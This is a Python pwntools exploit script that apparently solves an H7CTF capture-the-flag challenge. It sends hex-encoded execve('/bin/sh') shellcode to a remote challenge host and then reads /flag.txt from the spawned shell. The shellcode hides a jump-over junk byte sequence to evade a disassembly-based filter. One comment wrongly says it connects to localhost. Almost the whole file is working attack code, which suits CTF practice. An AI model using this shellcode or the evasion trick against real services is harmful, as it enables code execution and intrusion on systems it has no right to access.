from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'debug'  # Enable debug output

shell = """
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp

xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""

shellcode = asm(shell)[:3] + b'\xeb\x01\xe8' + asm(shell)[3:]

# Connect to localhost Docker container
log.info("Connecting to localhost:9999...")
p = remote("play.h7tex.com", 37327)

log.info("Waiting for prompt...")
p.recvuntil(b'without 0x prefix):\n', timeout=5)

log.info(f"Sending shellcode: {shellcode.hex()}")
p.sendline(shellcode.hex().encode())

# After shellcode executes, we get a shell
# Wait a moment for shell to spawn
time.sleep(1)

# Try to receive any output (may include disassembly table)
try:
    junk = p.recv(timeout=1)
    log.info(f"Received output: {len(junk)} bytes")
except:
    pass

log.info("Sending command to read flag...")
p.sendline(b'cat /flag.txt')
time.sleep(0.5)

log.info("Receiving flag...")
# Try to receive everything available
output = p.recvall(timeout=3)
log.info(f"Raw output: {output}")

# Extract flag from output
if b'H7CTF{' in output:
    flag_start = output.find(b'H7CTF{')
    flag_end = output.find(b'}', flag_start) + 1
    flag = output[flag_start:flag_end]
    log.success(f"Flag: {flag.decode().strip()}")
else:
    log.error("Flag not found in output!")

p.close()
